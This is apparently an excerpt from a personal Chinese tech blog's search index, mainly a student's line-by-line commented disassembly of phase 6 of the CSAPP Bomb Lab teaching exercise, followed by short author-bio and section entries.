# 6个局部变量,都是拿来干嘛的？？？ 18fe:\t41 56 push %r14 1900:\t41 55 push %r13 1902:\t41 54 push %r12 1904:\t55 push %rbp 1905:\t53 push %rbx 1906:\t48 83 ec 78 sub $0x78,%rsp # 分配120个bytes 190a:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax # 金丝雀值 1911:\t00 00 1913:\t48 89 44 24 68 mov %rax,0x68(%rsp) # 放到栈上，有104个bytes是可用的 1918:\t31 c0 xor %eax,%eax # 检测金丝雀值 191a:\t4c 8d 74 24 10 lea 0x10(%rsp),%r14 # 此时r14存放的是rsp + 16的地址 191f:\t4c 89 74 24 08 mov %r14,0x8(%rsp) # 把rsp + 16的地址放在rsp + 8的位置 1924:\t4c 89 f6 mov %r14,%rsi # 把rsp + 16的地址作为第二个参数 1927:\te8 f2 03 00 00 call 1d1e \u0026lt;read_six_numbers\u0026gt; # 读取了六个数字 rsp + 16 20 24 28 32 36放在这六个位置 192c:\t4d 89 f4 mov %r14,%r12 # r12中放 rsp + 16的地址 192f:\t41 bf 01 00 00 00 mov $0x1,%r15d # r15 = 1 1935:\t4d 89 f5 mov %r14,%r13 # r13中放 rsp + 16的地址 1938:\te9 c6 00 00 00 jmp 1a03 \u0026lt;phase_6+0x10b\u0026gt; # 跳转 193d:\te8 84 03 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 1942:\te9 ce 00 00 00 jmp 1a15 \u0026lt;phase_6+0x11d\u0026gt; 1947:\t48 83 c3 01 add $0x1,%rbx # rbx刚刚为1,这里就是作为一个循环控制变量 ++index（第二层循环） 194b:\t83 fb 05 cmp $0x5,%ebx # 和5比较 194e:\t0f 8f a7 00 00 00 jg 19fb \u0026lt;phase_6+0x103\u0026gt; # 如果大于5跳转 1954:\t41 8b 44 9d 00 mov 0x0(%r13,%rbx,4),%eax # r15小于5的情况：eax中存放 *(rsp + 4 * index) 1959:\t39 45 00 cmp %eax,0x0(%rbp) # 和首元素做比较 195c:\t75 e9 jne 1947 \u0026lt;phase_6+0x4f\u0026gt; # 不相等跳转，相等直接爆炸 195e:\te8 63 03 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 1963:\teb e2 jmp 1947 \u0026lt;phase_6+0x4f\u0026gt; 1965:\t48 8b 54 24 08 mov 0x8(%rsp),%rdx # 至此输入检查已经结束,rdx = rsp + 16（不要想错了，这里存放的值是rsp + 16） 196a:\t48 83 c2 18 add $0x18,%rdx # rdx = rsp + 36 196e:\tb9 07 00 00 00 mov $0x7,%ecx # rcx = 7 1973:\t89 c8 mov %ecx,%eax # eax = 7 1975:\t41 2b 04 24 sub (%r12),%eax # eax为7减去数组中的元素 1979:\t41 89 04 24 mov %eax,(%r12) # 再把这个减了之后的值加载回去 197d:\t49 83 c4 04 add $0x4,%r12 # 下一个数字 1981:\t4c 39 e2 cmp %r12,%rdx # 检查终止条件 1984:\t75 ed jne 1973 \u0026lt;phase_6+0x7b\u0026gt; 1986:\tbe 00 00 00 00 mov $0x0,%esi # 现在输入的每个数字都成了它对于7的补 rsi = 0，假设输入2 6 1 5 4 3 此时的值就是 5 1 6 2 3 4 rsi = 0 198b:\t8b 4c b4 10 mov 0x10(%rsp,%rsi,4),%ecx # rcx = *(rsp + 16 + 4 * rsi) 为数组的第一个值 198f:\tb8 01 00 00 00 mov $0x1,%eax # eax = 1 1994:\t48 8d 15 75 38 00 00 lea 0x3875(%rip),%rdx # gdb查看内存这里就是把一个链表的node1的地址加载给了rdx,尝试用gdb去查看链表的具体结构，大概就是结构体{value + key + nextAddress} 199b:\t83 f9 01 cmp $0x1,%ecx # rcx处的值和1比较 199e:\t7e 0b jle 19ab \u0026lt;phase_6+0xb3\u0026gt; # 小于等于1就跳转 19a0:\t48 8b 52 08 mov 0x8(%rdx),%rdx # rdx此时应该为节点指向的节点的地址 19a4:\t83 c0 01 add $0x1,%eax # ++eax 19a7:\t39 c8 cmp %ecx,%eax # rcx和 eax比较 19a9:\t75 f5 jne 19a0 \u0026lt;phase_6+0xa8\u0026gt; # 不相等跳转，直到数组的第一个值和链表第一个节点的值相等就跳转 19ab:\t48 89 54 f4 30 mov %rdx,0x30(%rsp,%rsi,8) # *(rsp + 48 + 8 * rsi) = rdx 把这个地址存放在stack上面 19b0:\t48 83 c6 01 add $0x1,%rsi # ++rsi 19b4:\t48 83 fe 06 cmp $0x6,%rsi # 循环终止条件 19b8:\t75 d1 jne 198b \u0026lt;phase_6+0x93\u0026gt; # 不相等继续 19ba:\t48 8b 5c 24 30 mov 0x30(%rsp),%rbx # 现在我们已经把按照输入数字顺序节点指向的地址放在了栈上（人话？）rbx为第一个地址 19bf:\t48 8b 44 24 38 mov 0x38(%rsp),%rax # rax是第二个地址 19c4:\t48 89 43 08 mov %rax,0x8(%rbx) # 以下就是把链表按照我们输入的顺序连接在一起，看不明白就画图 19c8:\t48 8b 54 24 40 mov 0x40(%rsp),%rdx 19cd:\t48 89 50 08 mov %rdx,0x8(%rax) 19d1:\t48 8b 44 24 48 mov 0x48(%rsp),%rax 19d6:\t48 89 42 08 mov %rax,0x8(%rdx) 19da:\t48 8b 54 24 50 mov 0x50(%rsp),%rdx 19df:\t48 89 50 08 mov %rdx,0x8(%rax) 19e3:\t48 8b 44 24 58 mov 0x58(%rsp),%rax 19e8:\t48 89 42 08 mov %rax,0x8(%rdx) 19ec:\t48 c7 40 08 00 00 00 movq $0x0,0x8(%rax) # 0就是null节点 19f3:\t00 19f4:\tbd 05 00 00 00 mov $0x5,%ebp # rbp = 5 19f9:\teb 35 jmp 1a30 \u0026lt;phase_6+0x138\u0026gt; # 连接完了之后跳转 19fb:\t49 83 c7 01 add $0x1,%r15 # 这是应该是第一层循环 19ff:\t49 83 c6 04 add $0x4,%r14 # 下一个 1a03:\t4c 89 f5 mov %r14,%rbp # 在成功读取六个数字之后跳转到这里，rbp存放rsp + 16地址（第一次） 1a06:\t41 8b 06 mov (%r14),%eax # 读取的第一个数字 1a09:\t83 e8 01 sub $0x1,%eax # 读取的数字-1 1a0c:\t83 f8 05 cmp $0x5,%eax # 和5作比较 1a0f:\t0f 87 28 ff ff ff ja 193d \u0026lt;phase_6+0x45\u0026gt; # 大于5爆炸（这意味着不能输入大于6的数字） 1a15:\t41 83 ff 05 cmp $0x5,%r15d # r15刚刚赋值为1,现在和5作比较 1a19:\t0f 8f 46 ff ff ff jg 1965 \u0026lt;phase_6+0x6d\u0026gt; # 大于5跳转（到这里为止，经过了一个类似于冒泡排序的比较，这意味着我们输入的数字不能有重复的也不能大于6） 1a1f:\t4c 89 fb mov %r15,%rbx # rbx = 1 1a22:\te9 2d ff ff ff jmp 1954 \u0026lt;phase_6+0x5c\u0026gt; 1a27:\t48 8b 5b 08 mov 0x8(%rbx),%rbx 1a2b:\t83 ed 01 sub $0x1,%ebp 1a2e:\t74 11 je 1a41 \u0026lt;phase_6+0x149\u0026gt;\t1a30:\t48 8b 43 08 mov 0x8(%rbx),%rax # 连接之后在这里 1a34:\t8b 00 mov (%rax),%eax 1a36:\t39 03 cmp %eax,(%rbx) 1a38:\t7d ed jge 1a27 \u0026lt;phase_6+0x12f\u0026gt;\t# 也就是说链表必须是递增还是递减的一个顺序？ 1a3a:\te8 87 02 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 1a3f:\teb e6 jmp 1a27 \u0026lt;phase_6+0x12f\u0026gt; 1a41:\t48 8b 44 24 68 mov 0x68(%rsp),%rax 1a46:\t64 48 2b 04 25 28 00 sub %fs:0x28,%rax 1a4d:\t00 00 1a4f:\t75 0f jne 1a60 \u0026lt;phase_6+0x168\u0026gt; 1a51:\t48 83 c4 78 add $0x78,%rsp 1a55:\t5b pop %rbx 1a56:\t5d pop %rbp 1a57:\t41 5c pop %r12 1a59:\t41 5d pop %r13 1a5b:\t41 5e pop %r14 1a5d:\t41 5f pop %r15 1a5f:\tc3 ret 1a60:\te8 eb f7 ff ff call 1250 \u0026lt;__stack_chk_fail@plt\u0026gt; 不容易，终于写完了。\n","date":"9 March 2025","externalUrl":null,"permalink":"/csapp/csappbomblab/","section":"","summary":"\u003cblockquote\u003e\n\u003cp\u003e本期封面是动漫《轻音少女》第一季时唯一律澪之间发生小矛盾的故事，此时，她们三个正在远远的看着mio\u0026hellip;\u0026hellip;\u003c/p\u003e\u003c/blockquote\u003e\n\n\n\u003ch1 class=\"relative group\"\u003eCSAPP:BombLab \n    \u003cdiv id=\"csappbomblab\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#csappbomblab\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e[!NOTE]\u003c/p\u003e\n\u003cp\u003e本文主要参考博客：arthals.ink，如果你要学习方法，你只要看TA写的就可以了，我只看了前两层，    只是做个记录，我认为对于我来说很好的解决问题方式就是写注释(所以我这里有逐行的注释)。\u003c/p\u003e","title":"CSAPP:BombLab","type":"csapp"},{"content":" \u0026ldquo;My Heart Is In The Work.\u0026rdquo; \u0026mdash;Andrew Carnegie\n","date":"8 March 2025","externalUrl":null,"permalink":"/tech/","section":"Tech","summary":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003e\u0026ldquo;My Heart Is In The Work.\u0026rdquo; \t\u0026mdash;Andrew Carnegie\u003c/strong\u003e\u003c/p\u003e\u003c/blockquote\u003e","title":"Tech","type":"tech"},{"content":" 自由，是说2 + 2 = 4的自由。 \u0026mdash;《1984》\n上图是笔者最喜欢的动漫角色之一，秋山澪,图作者SuperPig,希望大家喜欢。\n​\t笔者是在读本科生，专业是计算机科学与技术，对于技术感觉算不上热爱，但是也算感兴趣（毕竟要吃饭），虽然了解不深，但是自认为感兴趣的方向在网络和OS，喜欢ACG相关的文化，如果你想和我交流，欢迎加我的微信：mio18091418628\n​\t笔者高中期间没有信息竞赛相关经验，仅仅是为了熟悉算法以及数据结构刷过一些Leetcode和某些OJ网站，这是我的力扣主页,为了有效的练习，我还用Notion搭建了一个小题单,欢迎你的访问。\n","externalUrl":null,"permalink":"/author/","section":"","summary":"\u003cblockquote\u003e\n\u003cp\u003e自由，是说2 + 2 = 4的自由。 \u0026mdash;《1984》\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e\n    \u003cfigure\u003e\n      \u003cimg class=\"my-0 rounded-md\" loading=\"lazy\" src=\"/img/280px-%E7%A7%8B%E5%B1%B1%E6%BE%AA%E9%A5%AE%E6%96%99.png\" alt=\"秋山澪飲料.png\" /\u003e\n      \n    \u003c/figure\u003e\n\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e上图是笔者最喜欢的动漫角色之一，\u003ca href=\"https://k-on.fandom.com/wiki/Mio_Akiyama\" target=\"_blank\"\u003e秋山澪\u003c/a\u003e,图作者\u003ca href=\"https://www.pixiv.net/users/15231158\" target=\"_blank\"\u003eSuperPig\u003c/a\u003e,希望大家喜欢。\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e​\t笔者是在读本科生，专业是计算机科学与技术，对于技术感觉算不上热爱，但是也算感兴趣（毕竟要吃饭），虽然了解不深，但是自认为感兴趣的方向在网络和OS，喜欢ACG相关的文化，如果你想和我交流，欢迎加我的微信：mio18091418628\u003c/p\u003e\n\u003cp\u003e​\t笔者高中期间没有信息竞赛相关经验，仅仅是为了熟悉算法以及数据结构刷过一些Leetcode和某些OJ网站，这是我的\u003ca href=\"https://leetcode.cn/u/festive-goldwasser2cd/\" target=\"_blank\"\u003e力扣主页\u003c/a\u003e,为了有效的练习，我还用Notion搭建了一个小\u003ca href=\"https://soft-caution-b3f.notion.site/df14768a80fc47d984647e53710855bd?v=f08449aa1528400fb804127ba6a810e4\" target=\"_blank\"\u003e题单\u003c/a\u003e,欢迎你的访问。\u003c/p\u003e","title":"","type":"author"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"}]